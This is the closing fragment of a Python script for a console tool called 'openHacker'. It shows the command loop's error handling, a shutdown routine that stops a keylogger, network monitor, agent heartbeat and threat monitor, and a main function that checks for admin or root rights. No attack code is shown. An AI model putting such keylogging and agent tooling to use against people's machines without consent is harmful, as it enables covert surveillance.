                        print(output)
                    print(f"\n{Colors.SUCCESS}✅ Done ({result['execution_time']:.2f}s){Colors.RESET}")
                else:
                    print(f"\n{Colors.ERROR}❌ {result.get('output', 'Unknown error')}{Colors.RESET}")
                    
            except KeyboardInterrupt:
                print(f"\n{Colors.WARNING}👋 Exiting...{Colors.RESET}")
                self.running = False
            except Exception as e:
                print(f"{Colors.ERROR}❌ Error: {e}{Colors.RESET}")
                logger.error(f"Command error: {e}")
        
        # Cleanup
        if self.keylogger and self.keylogger.running:
            self.keylogger.stop()
        self.network_monitor.stop()
        self.agent.stop_heartbeat()
        self.threat_monitor.stop()
        self.db.close()
        print(f"\n{Colors.SUCCESS}✅ Shutdown complete.{Colors.RESET}")
        print(f"{Colors.WHITE}📁 Logs: {LOG_FILE}{Colors.RESET}")
        print(f"{Colors.WHITE}💾 Database: {DATABASE_FILE}{Colors.RESET}")
        print(f"{Colors.WHITE}📊 Reports: {PDF_REPORTS_DIR}{Colors.RESET}")

# =====================
# MAIN ENTRY POINT
# =====================
def main():
    try:
        print(f"{Colors.WHITE}🐙 Starting openHacker...{Colors.RESET}")
        
        if sys.version_info < (3, 7):
            print(f"{Colors.ERROR}❌ Python 3.7+ required{Colors.RESET}")
            sys.exit(1)
        
        needs_admin = False
        if platform.system().lower() == 'linux' and os.geteuid() != 0:
            needs_admin = True
        elif platform.system().lower() == 'windows':
            try:
                import ctypes
                if not ctypes.windll.shell32.IsUserAnAdmin():
                    needs_admin = True
            except:
                pass
        
        if needs_admin:
            print(f"{Colors.WARNING}⚠️ Run with sudo/admin for full functionality (firewall, raw sockets){Colors.RESET}")
        
        app = OpenHacker()
        app.run()
        
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}👋 Goodbye!{Colors.RESET}")
    except Exception as e:
        print(f"\n{Colors.ERROR}❌ Fatal error: {e}{Colors.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == "__main__":
    main()
